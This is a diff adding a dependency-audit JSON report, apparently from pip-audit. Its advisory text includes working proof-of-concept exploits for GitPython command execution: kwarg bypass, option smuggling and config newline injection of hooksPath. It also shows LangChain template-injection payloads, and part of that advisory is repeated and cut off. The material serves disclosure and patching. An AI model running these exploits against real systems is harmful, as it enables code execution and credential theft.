@@ -1,0 +1,1184 @@
+{
+  "dependencies": [
+    {
+      "name": "aiosqlite",
+      "version": "0.20.0",
+      "vulns": []
+    },
+    {
+      "name": "annotated-doc",
+      "version": "0.0.4",
+      "vulns": []
+    },
+    {
+      "name": "annotated-types",
+      "version": "0.7.0",
+      "vulns": []
+    },
+    {
+      "name": "anyio",
+      "version": "4.13.0",
+      "vulns": []
+    },
+    {
+      "name": "asgiref",
+      "version": "3.11.1",
+      "vulns": []
+    },
+    {
+      "name": "backoff",
+      "version": "2.2.1",
+      "vulns": []
+    },
+    {
+      "name": "bcrypt",
+      "version": "5.0.0",
+      "vulns": []
+    },
+    {
+      "name": "black",
+      "version": "24.4.2",
+      "vulns": [
+        {
+          "aliases": [
+            "CVE-2026-32274"
+          ],
+          "description": "### Impact  Black writes a cache file, the name of which is computed from various formatting options. The value of the `--python-cell-magics` option was placed in the filename without sanitization, which allowed an attacker who controls the value of this argument to write cache files to arbitrary file system locations.   ### Patches  Fixed in Black 26.3.1.  ### Workarounds  Do not allow untrusted user input into the value of the `--python-cell-magics` option.",
+          "fix_versions": [
+            "26.3.1"
+          ],
+          "id": "GHSA-3936-cmfr-pm3m"
+        }
+      ]
+    },
+    {
+      "name": "blinker",
+      "version": "1.9.0",
+      "vulns": []
+    },
+    {
+      "name": "boolean-py",
+      "version": "5.0",
+      "vulns": []
+    },
+    {
+      "name": "brotli",
+      "version": "1.2.0",
+      "vulns": []
+    },
+    {
+      "name": "build",
+      "version": "1.5.0",
+      "vulns": []
+    },
+    {
+      "name": "cachecontrol",
+      "version": "0.14.4",
+      "vulns": []
+    },
+    {
+      "name": "certifi",
+      "version": "2026.4.22",
+      "vulns": []
+    },
+    {
+      "name": "charset-normalizer",
+      "version": "3.4.7",
+      "vulns": []
+    },
+    {
+      "name": "chroma-hnswlib",
+      "version": "0.7.3",
+      "vulns": []
+    },
+    {
+      "name": "chromadb",
+      "version": "0.5.0",
+      "vulns": []
+    },
+    {
+      "name": "click",
+      "version": "8.3.3",
+      "vulns": []
+    },
+    {
+      "name": "configargparse",
+      "version": "1.7.5",
+      "vulns": []
+    },
+    {
+      "name": "coverage",
+      "version": "7.14.0",
+      "vulns": []
+    },
+    {
+      "name": "cuda-bindings",
+      "version": "13.2.0",
+      "vulns": []
+    },
+    {
+      "name": "cuda-pathfinder",
+      "version": "1.5.4",
+      "vulns": []
+    },
+    {
+      "name": "cuda-toolkit",
+      "version": "13.0.2",
+      "vulns": []
+    },
+    {
+      "name": "cyclonedx-python-lib",
+      "version": "7.6.2",
+      "vulns": []
+    },
+    {
+      "name": "defusedxml",
+      "version": "0.7.1",
+      "vulns": []
+    },
+    {
+      "name": "distro",
+      "version": "1.9.0",
+      "vulns": []
+    },
+    {
+      "name": "dnspython",
+      "version": "2.8.0",
+      "vulns": []
+    },
+    {
+      "name": "docker",
+      "version": "7.1.0",
+      "vulns": []
+    },
+    {
+      "name": "durationpy",
+      "version": "0.10",
+      "vulns": []
+    },
+    {
+      "name": "email-validator",
+      "version": "2.3.0",
+      "vulns": []
+    },
+    {
+      "name": "fastapi",
+      "version": "0.111.0",
+      "vulns": []
+    },
+    {
+      "name": "fastapi-cli",
+      "version": "0.0.24",
+      "vulns": []
+    },
+    {
+      "name": "filelock",
+      "version": "3.29.0",
+      "vulns": []
+    },
+    {
+      "name": "flask",
+      "version": "3.1.3",
+      "vulns": []
+    },
+    {
+      "name": "flask-cors",
+      "version": "6.0.2",
+      "vulns": []
+    },
+    {
+      "name": "flask-login",
+      "version": "0.6.3",
+      "vulns": []
+    },
+    {
+      "name": "flatbuffers",
+      "version": "25.12.19",
+      "vulns": []
+    },
+    {
+      "name": "fsspec",
+      "version": "2026.4.0",
+      "vulns": []
+    },
+    {
+      "name": "gevent",
+      "version": "26.4.0",
+      "vulns": []
+    },
+    {
+      "name": "geventhttpclient",
+      "version": "2.3.9",
+      "vulns": []
+    },
+    {
+      "name": "gitdb",
+      "version": "4.0.12",
+      "vulns": []
+    },
+    {
+      "name": "gitpython",
+      "version": "3.1.43",
+      "vulns": [
+        {
+          "aliases": [
+            "CVE-2026-42215"
+          ],
+          "description": "### Summary GitPython blocks dangerous Git options such as `--upload-pack` and `--receive-pack` by default, but the equivalent Python kwargs `upload_pack` and `receive_pack` bypass that check. If an application passes attacker-controlled kwargs into `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`, this leads to arbitrary command execution even when `allow_unsafe_options` is left at its default value of `False`.  ### Details GitPython explicitly treats helper-command options as unsafe because they can be used to execute arbitrary commands:  - `git/repo/base.py:145-153` marks clone options such as `--upload-pack`, `-u`, `--config`, and `-c` as unsafe. - `git/remote.py:535-548` marks fetch/pull/push options such as `--upload-pack`, `--receive-pack`, and `--exec` as unsafe.  The vulnerable API paths check the raw kwarg names before they're its normalized into command-line flags:  - `Repo.clone_from()` checks `list(kwargs.keys())` in `git/repo/base.py:1387-1390` - `Remote.fetch()` checks `list(kwargs.keys())` in `git/remote.py:1070-1071` - `Remote.pull()` checks `list(kwargs.keys())` in `git/remote.py:1124-1125` - `Remote.push()` checks `list(kwargs.keys())` in `git/remote.py:1197-1198`  That validation is performed by `Git.check_unsafe_options()` in `git/cmd.py:948-961`. The validator correctly blocks option names such as `upload-pack`, `receive-pack`, and `exec`.  Later, GitPython converts Python kwargs into Git command-line flags in `Git.transform_kwarg()` at `git/cmd.py:1471-1484`. During that step, underscore-form kwargs are dashified:  - `upload_pack=...` becomes `--upload-pack=...` - `receive_pack=...` becomes `--receive-pack=...`  Because the unsafe-option check runs before this normalization, underscore-form kwargs bypass the safety check even though they become the exact dangerous Git flags that the code is supposed to reject.  In practice:  - `remote.fetch(**{\"upload-pack\": helper})` is blocked with `UnsafeOptionError` - `remote.fetch(upload_pack=helper)` is allowed and reaches helper execution  The same bypass works for:  ```python Repo.clone_from(origin, out, upload_pack=helper) repo.remote(\"origin\").fetch(upload_pack=helper) repo.remote(\"origin\").pull(upload_pack=helper) repo.remote(\"origin\").push(receive_pack=helper) ```  This does not appear to affect every unsafe option. For example, `exec=` is already rejected because the raw kwarg name `exec` matches the blocked option name before normalization.  Existing tests cover the hyphenated form, not the vulnerable underscore form. For example:  - `test/test_clone.py:129-136` checks `{\"upload-pack\": ...}` - `test/test_remote.py:830-833` checks `{\"upload-pack\": ...}` - `test/test_remote.py:968-975` checks `{\"receive-pack\": ...}`  Those tests correctly confirm the literal Git option names are blocked, but they do not exercise the normal Python kwarg spelling that bypasses the guard.  ### PoC 1. Create and activate a virtual environment in the repository root:  ```bash python3 -m venv .venv-sec .venv-sec/bin/pip install setuptools gitdb source ./.venv-sec/bin/activate ```  2. make a new python file and put the following in there, then run it:  ```python import os import stat import subprocess import tempfile  from git import Repo from git.exc import UnsafeOptionError  # Setup: create isolated repositories so the PoC uses a normal fetch flow. base = tempfile.mkdtemp(prefix=\"gp-poc-risk-\") origin = os.path.join(base, \"origin.git\") producer = os.path.join(base, \"producer\") victim = os.path.join(base, \"victim\") proof = os.path.join(base, \"proof.txt\") wrapper = os.path.join(base, \"wrapper.sh\")  # Setup: this wrapper is just to demo things you can do, not required for the exploit to work # you could also do something like an SSH reverse shell, really anything with open(wrapper, \"w\") as f:     f.write(f\"\"\"#!/bin/sh {{   echo \"code_exec=1\"   echo \"whoami=$(id)\"   echo \"cwd=$(pwd)\"   echo \"uname=$(uname -a)\"   printf 'argv='; printf '<%s>' \"$@\"; echo   env | grep -E '^(HOME|USER|PATH|SSH_AUTH_SOCK|CI|GITHUB_TOKEN|AWS_|AZURE_|GOOGLE_)=' | sed 's/=.*$/=<redacted>/' || true }} > '{proof}' exec git-upload-pack \"$@\" \"\"\") os.chmod(wrapper, stat.S_IRWXU)  subprocess.run([\"git\", \"init\", \"--bare\", origin], check=True, stdout=subprocess.DEVNULL) subprocess.run([\"git\", \"clone\", origin, producer], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  with open(os.path.join(producer, \"README\"), \"w\") as f:     f.write(\"x\")  subprocess.run([\"git\", \"-C\", producer, \"add\", \"README\"], check=True, stdout=subprocess.DEVNULL) subprocess.run(     [\"git\", \"-C\", producer, \"-c\", \"user.name=t\", \"-c\", \"user.email=t@t\", \"commit\", \"-m\", \"init\"],     check=True,     stdout=subprocess.DEVNULL, ) subprocess.run([\"git\", \"-C\", producer, \"push\", \"origin\", \"HEAD\"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) subprocess.run([\"git\", \"clone\", origin, victim], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  repo = Repo(victim) remote = repo.remote(\"origin\")  # the literal Git option name is properly blocked. try:     remote.fetch(**{\"upload-pack\": wrapper})     print(\"control=unexpected_success\") except UnsafeOptionError:     print(\"control=blocked\")  # this is the actual vulnerability # you can also just do upload_pack=\"touch /tmp/proof\", the wrapper is just to show greater impact # if you do the \"touch /tmp/proof\" the script will crash, but the file will have been created remote.fetch(upload_pack=wrapper)  # Proof: the helper ran as the GitPython host process. print(\"proof_exists\", os.path.exists(proof), proof) print(open(proof).read()) ```  3. Expected result:  - The script prints `control=blocked` - The script prints `proof_exists True ...` - The proof file contains evidence that the attacker-controlled helper executed as the local application account, including `id`, working directory, argv, and selected environment variable names  Example output:  ```bash GitPython % python3 test.py control=blocked proof_exists True /var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/proof.txt code_exec=1 whoami=uid=501(wes) gid=20(staff) <redacted> cwd=/private/var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/victim uname=Darwin  <redacted> Darwin Kernel Version  <redacted>; root:xnu-11417. <redacted> argv=</var/folders/p4/kldmq4m13nd19dhy7lxs4jfw0000gn/T/gp-poc-risk-a1oftfku/origin.git> USER=<redacted> SSH_AUTH_SOCK=<redacted> PATH=<redacted> HOME=<redacted> ```  This PoC does not require a malicious repository. The PoC uses that fresh blank repository. The only attacker-controlled input is the kwarg that GitPython turns into `--upload-pack`.  ### Impact Who is impacted: - Web applications that let users configure repository import, sync, mirroring, fetch, pull, or push behavior - Systems that accept a user-provided dict of \"extra Git options\" and pass it into GitPython with `**kwargs` - CI/CD systems, workers, automation bots, or internal tools that build GitPython calls from untrusted integration settings or job definitions (yaml, json, etc configs )  What the attacker needs to control:  - A value that becomes `upload_pack` or `receive_pack` in the kwargs passed to `Repo.clone_from()`, `Remote.fetch()`, `Remote.pull()`, or `Remote.push()`  From a severity perspective, this could lead to - Theft of SSH keys, deploy credentials, API tokens, or cloud credentials available to the process - Modification of repositories, build outputs, or release artifacts - Lateral movement from CI/CD workers or automation hosts - Full compromise of the worker or service process handling repository operations  The highest-risk environments are network-reachable services and automation systems that expose these GitPython kwargs across a trust boundary while relying on the default unsafe-option guard for protection.",
+          "fix_versions": [
+            "3.1.47"
+          ],
+          "id": "GHSA-rpm5-65cw-6hj4"
+        },
+        {
+          "aliases": [
+            "CVE-2026-42284"
+          ],
+          "description": "### Summary  `_clone()` validates `multi_options` as the original list, then executes `shlex.split(\" \".join(multi_options))`. A string like `\"--branch main --config core.hooksPath=/x\"` passes validation (starts with `--branch`), but after split becomes `[\"--branch\", \"main\", \"--config\", \"core.hooksPath=/x\"]`. Git applies the config and executes attacker hooks during clone.  ### Details  The vulnerable code is in [`git/repo/base.py` line 1383](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1383): ```python multi = shlex.split(\" \".join(multi_options)) ```  Then validation runs on the **original** list at [line 1390](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1390): ```python Git.check_unsafe_options(options=multi_options, unsafe_options=cls.unsafe_git_clone_options) ```  Then execution uses the **transformed** result at [line 1392](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/repo/base.py#L1392): ```python proc = git.clone(multi, \"--\", url, path, ...) ```  The [check at `git/cmd.py` line 959](https://github.com/gitpython-developers/GitPython/blob/5937d14a2c5e532fcb3ece0f45bf75e5bf18539e/git/cmd.py#L959) uses `startswith`: ```python if option.startswith(unsafe_option) or option == bare_option: ```  `\"--branch main --config ...\"` does not start with `\"--config\"`, so it passes. After `shlex.split`, `\"--config\"` becomes its own token and reaches git.  Also affects `Submodule.update()` via `clone_multi_options`.  ### PoC  ```python import sys, pathlib, subprocess sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))  from git import Repo from git.exc import UnsafeOptionError  try:     Repo.clone_from(\"/nonexistent\", \"/tmp/x\", multi_options=[\"--config\", \"core.hooksPath=/x\"]) except UnsafeOptionError:     print(\"multi_options=['--config', '...']: Block as expected\") except Exception:     pass  DIR = pathlib.Path(__file__).resolve().parent / \"workdir_b\" SRC = DIR / \"repo\" DST = DIR / \"dst\" HOOKS = DIR / \"hooks\" LOG = DIR / \"output.log\"  if not SRC.exists():     SRC.mkdir(parents=True)     r = lambda *a: subprocess.run(a, cwd=SRC, capture_output=True)     r(\"git\", \"init\", \"-b\", \"main\")     (SRC / \"f\").write_text(\"x\\n\")     r(\"git\", \"add\", \".\")     r(\"git\", \"commit\", \"-m\", \"init\")  HOOKS.mkdir(exist_ok=True) hook = HOOKS / \"post-checkout\" hook.write_text(f\"#!/bin/sh\\nwhoami > {LOG.as_posix()}\\nhostname >> {LOG.as_posix()}\\n\") hook.chmod(0o755)  LOG.unlink(missing_ok=True) payload = \"--branch main --config core.hooksPath=\" + HOOKS.as_posix()  try:     Repo.clone_from(str(SRC), str(DST), multi_options=[payload]) except UnsafeOptionError:     print(f\"multi_options=['{payload}']: BLOCKED\"); sys.exit(1) except Exception:     pass  if not LOG.exists() and DST.exists():     subprocess.run([\"git\", \"checkout\", \"--force\", \"main\"], cwd=DST, capture_output=True)  print(f\"multi_options=['{payload}']: not blocked\") print(f\"\\nHook executed: {LOG.exists()}\") if LOG.exists():     print(LOG.read_text().strip()) ```  **Output:** ``` multi_options=['--config', '...']: Block as expected multi_options=['--branch main --config core.hooksPath=.../hooks']: not blocked  Hook executed: True texugo DESKTOP-5w5HH79 ```  ### Impact  Any application passing user input to `multi_options` in `clone_from()`, `clone()`, or `Submodule.update()` is vulnerable. Attacker embeds `--config core.hooksPath=<dir>` inside a string starting with a safe option. Check does not block it. Git executes attacker code. Same class as CVE-2023-40267.",
+          "fix_versions": [
+            "3.1.47"
+          ],
+          "id": "GHSA-x2qx-6953-8485"
+        },
+        {
+          "aliases": [
+            "CVE-2026-44244"
+          ],
+          "description": "`GitConfigParser.set_value()` passes values to Python's `configparser` without validating for newlines. GitPython's own `_write()` converts embedded newlines into indented continuation lines (e.g. `\\n` becomes `\\n\\t`), but Git still accepts an indented `[core]` stanza as a section header \u2014 so the injected `core.hooksPath` becomes effective configuration. Any Git operation that invokes hooks (commit, merge, checkout) will then execute scripts from the attacker-controlled path.  The vulnerability is not merely malformed config output: GitPython's own writer converts embedded newlines into indented continuation lines, but Git still accepts an indented `[core]` stanza as a section header, so the injected `core.hooksPath` becomes effective configuration.  This was found while auditing MLRun's `project.push()` method, which passes `author_name` and `author_email` directly to `config_writer().set_value()` with no sanitization. Both parameters cross a trust boundary \u2014 they are caller-supplied API inputs that end up in `.git/config`.  PoC (standalone, no MLRun required):  ```python import git, subprocess, os  repo = git.Repo(\"/tmp/testrepo\")  with repo.config_writer() as cw:     cw.set_value(\"user\", \"name\", \"foo\\n[core]\\nhooksPath=/tmp/hooks\")  r = subprocess.run([\"git\", \"config\", \"core.hooksPath\"], cwd=\"/tmp/testrepo\", capture_output=True, text=True) assert r.returncode == 0 print(r.stdout.strip())  # /tmp/hooks  os.makedirs(\"/tmp/hooks\", exist_ok=True) open(\"/tmp/hooks/pre-commit\", \"w\").write(\"#!/bin/sh\\nid > /tmp/pwned\\n\") os.chmod(\"/tmp/hooks/pre-commit\", 0o755)  repo.index.add([\"README\"]) repo.git.commit(m=\"test\") print(open(\"/tmp/pwned\").read())  # uid=... ```  Tested on GitPython 3.1.46, git 2.39+.  Impact: This is persistent repo config poisoning. Any user who can supply `author_name` or `author_email` to an application calling `config_writer().set_value()` can redirect Git hook execution to an arbitrary path. In a multi-user or hosted environment (e.g. a shared MLRun server where multiple users push to the same repositories), one user can poison the `.git/config` of a shared repo and have their hooks run in the context of every subsequent Git operation by any user. On single-user deployments, the impact depends on whether the application later invokes Git hooks automatically.  Remediation: `set_value()` should raise on CR, LF, or NUL in values rather than silently pass them through:  ```python import re  if isinstance(value, (str, bytes)) and re.search(r\"[\\r\\n\\x00]\", str(value)):     raise ValueError(\"Git config values must not contain CR, LF, or NUL\") ```  Rejecting is safer than stripping \u2014 a stripped newline might indicate the caller is passing unsanitized input at a higher level, and silent normalization masks that.  Affected wherever `config_writer().set_value(section, key, user_input)` is called with external input.** GitPython is a dependency of DVC, MLflow, Kedro, and others \u2014 worth auditing their `set_value()` call sites for externally influenced inputs.",
+          "fix_versions": [
+            "3.1.49"
+          ],
+          "id": "GHSA-v87r-6q3f-2j67"
+        },
+        {
+          "aliases": [],
+          "description": "Summary  The patch for CVE-2026-42215 (GitPython 3.1.49) validates newlines only in the value parameter of set_value(). The section and option parameters are passed to configparser without any newline validation. An attacker who controls the section argument can inject \\n to write arbitrary section headers into .git/config, including a forged [core] section with hooksPath pointing to an attacker-controlled directory, leading to RCE when any git hook is triggered.  Details  File: git/config.py \u2014 GitPython 3.1.49 (latest patched version)  ```python   def set_value(self, section: str, option: str, value) -> \"GitConfigParser\":       value_str = self._value_to_string_safe(value)   # only value is validated       if not self.has_section(section):           self.add_section(section)                    # section not validated       super().set(section, option, value_str)          # option not validated       return self ```  _write() formats section headers as \"[%s]\\n\" % name. When section = \"user]\\n[core\", this writes [user]\\n[core]\\n \u2014 two valid section headers \u2014 into .git/config.  PoC  ```python   import git, os, subprocess    repo = git.Repo.init(\"/tmp/bypass_test\")    os.makedirs(\"/tmp/evil_hooks\", exist_ok=True)   with open(\"/tmp/evil_hooks/pre-commit\", \"w\") as f:       f.write(\"#!/bin/sh\\nid > /tmp/rce_proof.txt\\n\")   os.chmod(\"/tmp/evil_hooks/pre-commit\", 0o755)    # Inject newline into section parameter (not value \u2014 already patched)   with repo.config_writer() as cw:       cw.set_value(\"user]\\n[core\", \"hooksPath\", \"/tmp/evil_hooks\")    r = subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"config\", \"core.hooksPath\"],                      capture_output=True, text=True)   print(r.stdout.strip())  # \u2192 /tmp/evil_hooks    subprocess.run([\"git\", \"-C\", \"/tmp/bypass_test\", \"commit\", \"--allow-empty\", \"-m\", \"x\"])   print(open(\"/tmp/rce_proof.txt\").read())  # \u2192 uid=1000(...) RCE confirmed ```  Impact  Same attack outcome as CVE-2026-42215 (RCE via core.hooksPath injection). The patch is incomplete \u2014 only value is validated while section and option remain injectable.",
+          "fix_versions": [
+            "3.1.50"
+          ],
+          "id": "GHSA-mv93-w799-cj2w"
+        }
+      ]
+    },
+    {
+      "name": "googleapis-common-protos",
+      "version": "1.75.0",
+      "vulns": []
+    },
+    {
+      "name": "greenlet",
+      "version": "3.5.0",
+      "vulns": []
+    },
+    {
+      "name": "grpcio",
+      "version": "1.80.0",
+      "vulns": []
+    },
+    {
+      "name": "h11",
+      "version": "0.16.0",
+      "vulns": []
+    },
+    {
+      "name": "hf-xet",
+      "version": "1.5.0",
+      "vulns": []
+    },
+    {
+      "name": "html5lib",
+      "version": "1.1",
+      "vulns": []
+    },
+    {
+      "name": "httpcore",
+      "version": "1.0.9",
+      "vulns": []
+    },
+    {
+      "name": "httptools",
+      "version": "0.7.1",
+      "vulns": []
+    },
+    {
+      "name": "httpx",
+      "version": "0.27.2",
+      "vulns": []
+    },
+    {
+      "name": "huggingface-hub",
+      "version": "0.36.2",
+      "vulns": []
+    },
+    {
+      "name": "idna",
+      "version": "3.14",
+      "vulns": []
+    },
+    {
+      "name": "importlib-metadata",
+      "version": "8.7.1",
+      "vulns": []
+    },
+    {
+      "name": "importlib-resources",
+      "version": "7.1.0",
+      "vulns": []
+    },
+    {
+      "name": "iniconfig",
+      "version": "2.3.0",
+      "vulns": []
+    },
+    {
+      "name": "itsdangerous",
+      "version": "2.2.0",
+      "vulns": []
+    },
+    {
+      "name": "jinja2",
+      "version": "3.1.6",
+      "vulns": []
+    },
+    {
+      "name": "joblib",
+      "version": "1.5.3",
+      "vulns": []
+    },
+    {
+      "name": "jsonpatch",
+      "version": "1.33",
+      "vulns": []
+    },
+    {
+      "name": "jsonpointer",
+      "version": "3.1.1",
+      "vulns": []
+    },
+    {
+      "name": "kubernetes",
+      "version": "35.0.0",
+      "vulns": []
+    },
+    {
+      "name": "langchain-core",
+      "version": "0.2.43",
+      "vulns": [
+        {
+          "aliases": [
+            "CVE-2025-65106"
+          ],
+          "description": "## Context  A template injection vulnerability exists in LangChain's prompt template system that allows attackers to access Python object internals through template syntax. This vulnerability affects applications that accept **untrusted template strings** (not just template variables) in `ChatPromptTemplate` and related prompt template classes.  Templates allow attribute access (`.`) and indexing (`[]`) but not method invocation (`()`).  The combination of attribute access and indexing may enable exploitation depending on which objects are passed to templates. When template variables are simple strings (the common case), the impact is limited. However, when using `MessagesPlaceholder` with chat message objects, attackers can traverse through object attributes and dictionary lookups (e.g., `__globals__`) to reach sensitive data such as environment variables.  The vulnerability specifically requires that applications accept **template strings** (the structure) from untrusted sources, not just **template variables** (the data). Most applications either do not use templates or else use hardcoded templates and are not vulnerable.  ## Affected Components  - `langchain-core` package - Template formats:   - F-string templates (`template_format=\"f-string\"`) - **Vulnerability fixed**   - Mustache templates (`template_format=\"mustache\"`) - **Defensive hardening**   - Jinja2 templates (`template_format=\"jinja2\"`) - **Defensive hardening**  ### Impact Attackers who can control template strings (not just template variables) can: - Access Python object attributes and internal properties via attribute traversal - Extract sensitive information from object internals (e.g., `__class__`, `__globals__`) - Potentially escalate to more severe attacks depending on the objects passed to templates  ### Attack Vectors  #### 1. F-string Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate  malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__.__name__}\")],     template_format=\"f-string\" )  # Note that this requires passing a placeholder variable for \"msg.__class__.__name__\". result = malicious_template.invoke({\"msg\": \"foo\", \"msg.__class__.__name__\": \"safe_placeholder\"}) # Previously returned # >>> result.messages[0].content # >>> 'str' ```  #### 2. Mustache Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.__class__.__name__}}\")],     template_format=\"mustache\" )  result = malicious_template.invoke({\"question\": msg}) # Previously returned: \"HumanMessage\" (getattr() exposed internals) ```  #### 3. Jinja2 Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.parse_raw}}\")],     template_format=\"jinja2\" )  result = malicious_template.invoke({\"question\": msg}) # Could access non-dunder attributes/methods on objects ```  ### Root Cause  1. **F-string templates**: The implementation used Python's `string.Formatter().parse()` to extract variable names from template strings. This method returns the complete field expression, including attribute access syntax:      ```python      from string import Formatter       template = \"{msg.__class__} and {x}\"      print([var_name for (_, var_name, _, _) in Formatter().parse(template)])      # Returns: ['msg.__class__', 'x']     ```      The extracted names were not validated to ensure they were simple identifiers. As a result, template strings containing attribute traversal and indexing expressions (e.g., `{obj.__class__.__name__}` or `{obj.method.__globals__[os]}`) were accepted and subsequently evaluated during formatting. While f-string templates do not support method calls with `()`, they do support `[]` indexing, which could allow traversal through dictionaries like `__globals__` to reach sensitive objects. 2. **Mustache templates**: By design, used `getattr()` as a fallback to support accessing attributes on objects (e.g., `{{user.name}}` on a User object). However, we decided to restrict this to simpler primitives that subclass dict, list, and tuple types as defensive hardening, since untrusted templates could exploit attribute access to reach internal properties like class on arbitrary objects 3. **Jinja2 templates**: Jinja2's default `SandboxedEnvironment` blocks dunder attributes (e.g., `__class__`) but permits access to other attributes and methods on objects. While Jinja2 templates in LangChain are typically used with trusted template strings, as a defense-in-depth measure, we've restricted the environment to block all attribute and method access on objects    passed to templates.   ## Who Is Affected?  ### High Risk Scenarios You are affected if your application: - Accepts template strings from untrusted sources (user input, external APIs, databases) - Dynamically constructs prompt templates based on user-provided patterns - Allows users to customize or create prompt templates  **Example vulnerable code:** ```python # User controls the template string itself user_template_string = request.json.get(\"template\")  # DANGEROUS  prompt = ChatPromptTemplate.from_messages(     [(\"human\", user_template_string)],     template_format=\"mustache\" )  result = prompt.invoke({\"data\": sensitive_object}) ```  ### Low/No Risk Scenarios You are **NOT** affected if: - Template strings are hardcoded in your application code - Template strings come only from trusted, controlled sources - Users can only provide **values** for template variables, not the template structure itself  **Example safe code:** ```python # Template is hardcoded - users only control variables prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"User question: {question}\")],  # SAFE     template_format=\"f-string\" )  # User input only fills the 'question' variable result = prompt.invoke({\"question\": user_input}) ```  ## The Fix  ### F-string Templates F-string templates had a clear vulnerability where attribute access syntax was exploitable. We've added strict validation to prevent this:  - Added validation to enforce that variable names must be valid Python identifiers - Rejects syntax like `{obj.attr}`, `{obj[0]}`, or `{obj.__class__}` - Only allows simple variable names: `{variable_name}`  ```python # After fix - these are rejected at template creation time ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__}\")],  # ValueError: Invalid variable name     template_format=\"f-string\" ) ```  ### Mustache Templates (Defensive Hardening) As defensive hardening, we've restricted what Mustache templates support to reduce the attack surface:  - Replaced `getattr()` fallback with strict type checking - Only allows traversal into `dict`, `list`, and `tuple` types - Blocks attribute access on arbitrary Python objects  ```python # After hardening - attribute access returns empty string prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.__class__}}\")],     template_format=\"mustache\" ) result = prompt.invoke({\"msg\": HumanMessage(\"test\")}) # Returns: \"\" (access blocked) ```  ### Jinja2 Templates (Defensive Hardening) As defensive hardening, we've significantly restricted Jinja2 template capabilities:  - Introduced `_RestrictedSandboxedEnvironment` that blocks **ALL** attribute/method access - Only allows simple variable lookups from the context dictionary - Raises `SecurityError` on any attribute access attempt  ```python # After hardening - all attribute access is blocked prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.content}}\")],     template_format=\"jinja2\" ) # Raises SecurityError: Access to attributes is not allowed ```  **Important Recommendation**: Due to the expressiveness of Jinja2 and the difficulty of fully sandboxing it, **we recommend reserving Jinja2 templates for trusted sources only**. If you need to accept template strings from untrusted users, use f-string or mustache templates with the new restrictions instead.  While we've hardened the Jinja2 implementation, the nature of templating engines makes comprehensive sandboxing challenging. The safest approach is to only use Jinja2 templates when you control the template source.  **Important Reminder**: Many applications do not need prompt templates. Templates are useful for variable substitution and dynamic logic (if statements, loops, conditionals). However, if you're building a chatbot or conversational application, you can often work directly with message objects (e.g., `HumanMessage`, `AIMessage`, `ToolMessage`) without templates. Direct message construction avoids template-related security concerns entirely.  ## Remediation  ### Immediate Actions  1. **Audit your code** for any locations where template strings come from untrusted sources 2. **Update to the patched version** of `langchain-core` 3. **Review template usage** to ensure separation between template structure and user data  ### Best Practices  - **Consider if you need templates at all** - Many applications can work directly with message objects (`HumanMessage`, `AIMessage`, etc.) without templates## Context  A template injection vulnerability exists in LangChain's prompt template system that allows attackers to access Python object internals through template syntax. This vulnerability affects applications that accept **untrusted template strings** (not just template variables) in `ChatPromptTemplate` and related prompt template classes.  Templates allow attribute access (`.`) and indexing (`[]`) but not method invocation (`()`).  The combination of attribute access and indexing may enable exploitation depending on which objects are passed to templates. When template variables are simple strings (the common case), the impact is limited. However, when using `MessagesPlaceholder` with chat message objects, attackers can traverse through object attributes and dictionary lookups (e.g., `__globals__`) to reach sensitive data such as environment variables.  The vulnerability specifically requires that applications accept **template strings** (the structure) from untrusted sources, not just **template variables** (the data). Most applications either do not use templates or else use hardcoded templates and are not vulnerable.  ## Affected Components  - `langchain-core` package - Template formats:   - F-string templates (`template_format=\"f-string\"`) - **Vulnerability fixed**   - Mustache templates (`template_format=\"mustache\"`) - **Defensive hardening**   - Jinja2 templates (`template_format=\"jinja2\"`) - **Defensive hardening**  ### Impact Attackers who can control template strings (not just template variables) can: - Access Python object attributes and internal properties via attribute traversal - Extract sensitive information from object internals (e.g., `__class__`, `__globals__`) - Potentially escalate to more severe attacks depending on the objects passed to templates  ### Attack Vectors  #### 1. F-string Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate  malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__.__name__}\")],     template_format=\"f-string\" )  # Note that this requires passing a placeholder variable for \"msg.__class__.__name__\". result = malicious_template.invoke({\"msg\": \"foo\", \"msg.__class__.__name__\": \"safe_placeholder\"}) # Previously returned # >>> result.messages[0].content # >>> 'str' ```  #### 2. Mustache Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.__class__.__name__}}\")],     template_format=\"mustache\" )  result = malicious_template.invoke({\"question\": msg}) # Previously returned: \"HumanMessage\" (getattr() exposed internals) ```  #### 3. Jinja2 Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     